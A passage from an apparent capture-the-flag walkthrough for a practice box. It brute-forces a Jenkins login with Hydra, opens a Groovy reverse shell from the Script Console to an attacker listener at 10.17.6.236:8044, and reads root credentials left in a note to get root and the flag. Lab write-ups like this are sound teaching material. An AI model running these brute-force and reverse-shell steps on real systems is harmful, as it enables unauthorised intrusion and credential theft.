└─$ `hydra -l admin -P rockyou.txt 127.0.0.1 -s 8080  http-get /login`
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-23 01:00:27
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://127.0.0.1:8080/login
[8080][http-get] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-23 01:00:52


# we got credentials - login: admin   password: 
# we got successfull access now lets enumerate more

# From Jenkins we can get reverse shell from Script Console, using groovy script

Go To Manage Jenkis > Script Console

Reverse shell - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
I works with both windows and linux as well

Use this in Script Console and make required changes:

String host="10.17.6.236";
int port=8044;
String cmd="/bin/bash";


Start listener on kali and click run on script console

┌──(kali㉿kali)-[~]
└─$ `nc -nvlp 8044`
listening on [any] 8044 ...
connect to [10.17.6.236] from (UNKNOWN) [10.10.52.46] 41422
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
`/bin/bash -i`
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$

# If we see IP , we can see that it is that docker container ip 172.17.0.2

jenkins@jenkins:/$ `ip addr`
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
jenkins@jenkins:/$ 


# Lets enumerate more

jenkins@jenkins:/tmp$ `cd /home`
cd /home
jenkins@jenkins:/home$ `ls`
ls
jenkins@jenkins:/home$ `cd /tmp`
cd /tmp
jenkins@jenkins:/tmp$ `ls`
ls
hsperfdata_jenkins
hsperfdata_root
jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
jetty-0_0_0_0-8080-war-_-any-6305215944353899641.dir
winstone4805797399595250733.jar
winstone7166027169177973699.jar
winstone8997783591456312974.jar

jenkins@jenkins:/tmp$ `cd /opt`
cd /opt
jenkins@jenkins:/opt$ `ls`
ls
note.txt
jenkins@jenkins:/opt$ `cat note.txt`
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$ 


# LOL! we got the root credentials,  Lets switch back to SSH session we already have for aubreanna user and switch to root user

aubreanna@internal:~$ `su root`
Password: 
root@internal:/home/aubreanna# `find / -name root.txt 2>/dev/null`
/root/root.txt
root@internal:/home/aubreanna# 

# We found our second flag also

root@internal:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
root@internal:~# 




